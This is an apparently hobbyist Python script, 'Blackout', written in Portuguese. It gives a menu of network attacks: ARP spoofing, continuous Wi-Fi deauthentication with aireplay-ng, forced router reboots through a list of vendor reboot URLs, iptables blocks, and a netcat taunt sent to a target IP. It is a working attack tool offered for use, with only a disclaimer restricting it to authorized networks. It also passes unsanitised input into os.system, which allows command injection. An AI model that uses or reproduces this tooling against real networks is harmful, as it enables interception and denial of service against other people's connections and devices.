
# ======================================================
#   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗
#  ██╔════╝ ██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║
#  ██║  ███╗██║     ███████║██║     █████╔╝ ██║   ██║██║
#  ██║   ██║██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║
#  ╚██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝██║
#   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝
#
#   Script: Blackout
#   Projeto: ZeroKey
#   Autor: LUAN CARLOS
#   Uso: Apenas em redes autorizadas ⚠️
# ======================================================

from colorama import init, Fore, Style
import os
import sys
import subprocess
from datetime import datetime
import time
import platform
import getpass
import requests
from requests.auth import HTTPBasicAuth

init(autoreset=True)

# Função para autenticação por senha
def autenticar():
    senha_correta = "root"
    senha = input(Fore.RED + "[!] Autenticação necessária\nSenha de acesso: ")
    if senha != senha_correta:
        print(Fore.RED + "Acesso negado!")
        exit()

def banner():
    print(Fore.LIGHTRED_EX + """
╔════════════════════════════════════════╗
║            🔒 BLACKOUT 1.0             ║
╚════════════════════════════════════════╝
 [!] Uso permitido somente em redes autorizadas!
""")

def log_ataque(tipo, detalhes):
    with open("logs.txt", "a") as f:
        f.write(f"[{datetime.now()}] {tipo}: {detalhes}\n")

def get_mac(ip):
    try:
        os.system(f"ping -n 1 {ip}" if os.name == "nt" else f"ping -c 1 {ip}")
        output = subprocess.check_output("arp -a", shell=True, text=True)
        for line in output.splitlines():
            if ip in line:
                partes = line.split()
                for parte in partes:
                    if "-" in parte or ":" in parte:
                        return parte
    except Exception as e:
        print(Fore.RED + f"Erro ao obter MAC de {ip}: {e}")
    return None

def arp_spoof():
    ip_alvo = input("IP do alvo: ")
    ip_gateway = input("IP do gateway/roteador: ")
    interface = input("Interface (ex: wlan0): ")

    mac_alvo = get_mac(ip_alvo)
    mac_gateway = get_mac(ip_gateway)

    if not mac_alvo or not mac_gateway:
        print(Fore.RED + "❌ Não foi possível obter os MACs. Verifique se os IPs estão ativos na rede.")
        return

    print(Fore.YELLOW + f"MAC do alvo: {mac_alvo}")
    print(Fore.YELLOW + f"MAC do gateway: {mac_gateway}")

    comando = f"ArpSpoof -i {interface} {ip_gateway} {ip_alvo}"

   # comando = (
       # f"ArpSpoof --interface {interface} "
       # f"--gateway {ip_gateway} --mac-gateway {mac_gateway} "
       # f"--target {ip_alvo} --mac-target {mac_alvo}" )

    log_ataque("ARP Spoof", f"Alvo: {ip_alvo}, Gateway: {ip_gateway}")
    os.system(comando)

def bloquear_por_ip():
    ip = input("IP a ser bloqueado: ")
    comando = f"iptables -A INPUT -s {ip} -j DROP"
    log_ataque("Bloqueio por IP", f"IP: {ip}")
    os.system(comando)

def bloquear_por_mac():
    mac = input("MAC a ser bloqueado: ")
    comando = f"iptables -A INPUT -m mac --mac-source {mac} -j DROP"
    log_ataque("Bloqueio por MAC", f"MAC: {mac}")
    os.system(comando)

def deauth_wifi():
    interface = input("Interface Wi-Fi em monitor mode (ex: wlan0mon): ")
    bssid = input("BSSID do roteador: ")
    station = input("MAC do alvo (station): ")
    comando = f"aireplay-ng --deauth 0 -a {bssid} -c {station} {interface}"
    log_ataque("Deauth Wi-Fi", f"Alvo: {station}, Roteador: {bssid}")
    os.system(comando)

def reiniciar_roteador():
    ip_roteador = input("IP do roteador: ")
    usuario = input("Usuário: ")
    senha = input("Senha: ")

    print("\nTentando reiniciar o roteador...")

    urls_comuns = [
        f"http://{ip_roteador}/goform/SysToolReboot",
        f"http://{ip_roteador}/rebootinfo.cgi",
        f"http://{ip_roteador}/system/reboot.asp",
        f"http://{ip_roteador}/userRpm/SysRebootRpm.htm",  # TP-Link
        f"http://{ip_roteador}/reboot.cgi",                # D-Link
        f"http://{ip_roteador}/cgi-bin/luci/;stok=/reboot", # OpenWRT
        f"http://{ip_roteador}/cgi-bin/system_reboot.asp",
        f"http://{ip_roteador}/adm/system_command.asp?command=reboot",
        f"http://{ip_roteador}/resetrouter.cgi",
        f"http://{ip_roteador}/maintenance/reboot.cgi"
    ]

    for url in urls_comuns:
        try:
            resposta = requests.post(url, auth=HTTPBasicAuth(usuario, senha), timeout=5)
            if resposta.status_code == 200:
                print(f"[✓] Roteador reiniciado com sucesso via {url}")
                log_ataque("Reinício de Roteador", f"IP: {ip_roteador}, URL usada: {url}")
                return
            elif resposta.status_code == 401:
                print(f"[!] Acesso negado em: {url} (usuário/senha incorretos)")
            elif resposta.status_code == 404:
                print(f"[×] Página não encontrada: {url}")
            else:
                print(f"[!] Código inesperado ({resposta.status_code}) em: {url}")
        except requests.exceptions.RequestException as e:
            print(f"[×] Erro ao acessar {url}: {e}")

    print("[!] Nenhuma URL de reinicialização funcionou.")

def zoar_com_dedo():
    ip = input("IP do alvo: ")
    comando = f"echo '🖕' | nc {ip} 1234"
    log_ataque("Zoar alvo", f"IP: {ip}")
    os.system(comando)

def menu():
    print("""
Escolha o tipo de ataque:
[1] ARP Spoof
[2] Bloquear por IP
[3] Bloquear por MAC
[4] Deauth Wi-Fi
[5] Reiniciar Roteador
[6] Zoar alvo com dedo do meio 🖕
[0] Sair
""")

def main():
    autenticar()
    banner()
    while True:
        menu()
        opcao = input("Selecione uma opção: ")
        if opcao == "1":
            arp_spoof()
        elif opcao == "2":
            bloquear_por_ip()
        elif opcao == "3":
            bloquear_por_mac()
        elif opcao == "4":
            deauth_wifi()
        elif opcao == "5":
            reiniciar_roteador()
        elif opcao == "6":
            zoar_com_dedo()
        elif opcao == "0":
            print(Fore.GREEN + "Saindo...")
            break
        else:
            print(Fore.RED + "Opção inválida!")

if __name__ == "__main__":
    main()